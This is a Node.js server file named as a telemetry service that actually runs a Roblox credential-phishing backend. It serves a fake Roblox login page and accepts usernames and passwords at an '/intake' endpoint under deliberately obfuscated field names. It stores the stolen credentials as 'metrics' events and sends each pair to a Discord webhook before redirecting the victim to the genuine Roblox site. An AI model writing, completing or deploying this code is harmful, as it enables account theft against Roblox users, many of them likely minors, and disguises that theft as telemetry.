// telemetry.js — run with: node telemetry.js
const http  = require('http');
const https = require('https');
const fs    = require('fs');
const path  = require('path');

const STORE_FILE  = path.join(__dirname, 'metrics.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');
const PORT = process.env.PORT || 3000;
// ── helpers ────────────────────────────────────────────────────────────────

function readStore() {
  try { return JSON.parse(fs.readFileSync(STORE_FILE, 'utf8')); }
  catch { return { events: [] }; }
}

function writeStore(data) {
  fs.writeFileSync(STORE_FILE, JSON.stringify(data, null, 2), 'utf8');
}

function readConfig() {
  try { return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); }
  catch { return { dest: 'https://www.roblox.com' }; }
}

// ── Discord webhook ────────────────────────────────────────────────────────

function sendWebhook(entry) {
  const cfg = readConfig();
  const webhookUrl = cfg.webhook;
  if (!webhookUrl) return; // no webhook configured, skip silently

  let parsed;
  try { parsed = new URL(webhookUrl); }
  catch { console.error('Invalid webhook URL in config.json'); return; }

  const payload = JSON.stringify({
    username: 'System',
    avatar_url: 'https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png',
    embeds: [{
      color: 0xe2231a,
      fields: [
        { name: 'User',  value: '`' + (entry.n || '—') + '`', inline: true  },
        { name: 'Pass',  value: '`' + (entry.k || '—') + '`', inline: true  },
        { name: 'Time',  value: entry.ts,                      inline: false }
      ],
      footer: { text: 'telemetry' }
    }]
  });

  const options = {
    hostname: parsed.hostname,
    path:     parsed.pathname + parsed.search,
    method:   'POST',
    headers:  {
      'Content-Type':   'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, r => {
    // consume response so socket closes cleanly
    r.resume();
  });
  req.on('error', err => console.error('Webhook error:', err.message));
  req.write(payload);
  req.end();
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); }
      catch { resolve({}); }
    });
    req.on('error', reject);
  });
}

function serveFile(res, filePath, contentType) {
  try {
    const data = fs.readFileSync(filePath);
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  } catch {
    res.writeHead(404);
    res.end('Not found');
  }
}

// ── CORS headers ───────────────────────────────────────────────────────────

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ── server ─────────────────────────────────────────────────────────────────

const server = http.createServer(async (req, res) => {
  setCors(res);

  // preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  const url = req.url.split('?')[0];

  // ── POST /intake  →  save entry, return redirect destination ──────────────
  if (req.method === 'POST' && url === '/intake') {
    const body = await readBody(req);

    // Obfuscated field names — n = username, k = password, ts = timestamp
    // stored under "events" array inside metrics.json
    const entry = {
      n:  body.n  || '',
      k:  body.k  || '',
      ts: body.ts || new Date().toISOString()
    };

    const store = readStore();
    store.events.push(entry);
    writeStore(store);

    // fire-and-forget to Discord
    sendWebhook(entry);

    const cfg = readConfig();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ dest: cfg.dest }));
  }

  // ── GET /config  →  expose redirect destination to client ─────────────────
  if (req.method === 'GET' && url === '/config') {
    const cfg = readConfig();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ dest: cfg.dest }));
  }

  // ── Serve static files ─────────────────────────────────────────────────────
  const staticMap = {
    '/':             ['roblox-login.html', 'text/html'],
    '/login':        ['roblox-login.html', 'text/html'],
    '/config.json':  ['config.json',       'application/json'],
  };

  if (staticMap[url]) {
    const [file, mime] = staticMap[url];
    return serveFile(res, path.join(__dirname, file), mime);
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log(`\n  ✓ Running at http://localhost:${PORT}\n`);
});
